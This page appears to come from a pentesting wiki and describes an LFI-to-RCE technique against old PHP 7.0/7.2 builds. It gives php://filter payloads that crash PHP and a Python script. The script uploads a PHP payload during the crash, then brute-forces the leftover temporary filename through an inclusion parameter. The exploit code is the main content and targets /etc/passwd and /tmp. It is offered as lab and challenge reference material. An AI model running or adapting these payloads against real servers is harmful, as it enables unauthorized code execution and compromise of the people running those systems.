# LFI2RCE via Segmentation Fault

{{#include ../../banners/hacktricks-training.md}}

The following `php://filter` payloads caused segmentation faults in the specific PHP 7.0 and 7.2 environments used by the original challenge writeups.<sup>[[1]](#references)[[2]](#references)</sup>

> [!NOTE]
> These are version-specific crashes, not reliable payloads for current PHP releases. Reproduce them only in a controlled environment that matches the affected build.

```php
// PHP 7.0
include("php://filter/string.strip_tags/resource=/etc/passwd");

// PHP 7.2
include("php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA");
```

For a multipart POST upload, PHP stores the file in its configured upload temporary directory, or the system temporary directory when none is configured. Unless the application moves or renames it, PHP normally deletes the temporary file at the end of the request.<sup>[[3]](#references)</sup>

In the affected versions, crashing PHP during the upload can interrupt that cleanup and leave the temporary file behind. If a separate local file inclusion (LFI) vulnerability can include files from the temporary directory, an attacker can search for the generated name and include the uploaded PHP payload.<sup>[[1]](#references)[[2]](#references)</sup>

The archived `easyengine/php7.0` container can provide a PHP 7.0 test environment.<sup>[[4]](#references)</sup>

```python
# Upload a file while triggering the segmentation fault.
import requests
url = "http://localhost:8008/index.php?i=php://filter/string.strip_tags/resource=/etc/passwd"
with open("la.php", "rb") as payload:
    try:
        requests.post(url, files={"file": payload})
    except requests.RequestException:
        pass  # The deliberately crashed worker may drop the connection.

# Search for a six-character PHP temporary-file suffix.
import itertools
import string

charset = string.ascii_letters + string.digits
base_url = "http://127.0.0.1:8008"

# This exhaustive 62^6 loop is intentionally simple and can take a very long time.
for chars in itertools.product(charset, repeat=6):
    suffix = "".join(chars)
    candidate = f"{base_url}/index.php?i=/tmp/php{suffix}"
    response = requests.get(candidate, timeout=5)
    if b"spyd3r" in response.content:
        print(f"[+] Include succeeded: {candidate}")
        break
```

The exhaustive example is useful for illustrating the filename search, but it is not operationally efficient. In a lab, constrain the candidate space with observed temporary-name behavior or use bounded concurrency without overwhelming the target.

## References

- [1] [One Line PHP Challenge and the Return of One Line PHP Challenge writeup](https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/)
- [2] [PHP segmentation fault via php://filter chains (HackMD writeup)](https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view)
- [3] [PHP manual: POST method uploads](https://www.php.net/manual/en/features.file-upload.post-method.php)
- [4] [Docker Hub: `easyengine/php7.0`](https://hub.docker.com/r/easyengine/php7.0)

{{#include ../../banners/hacktricks-training.md}}
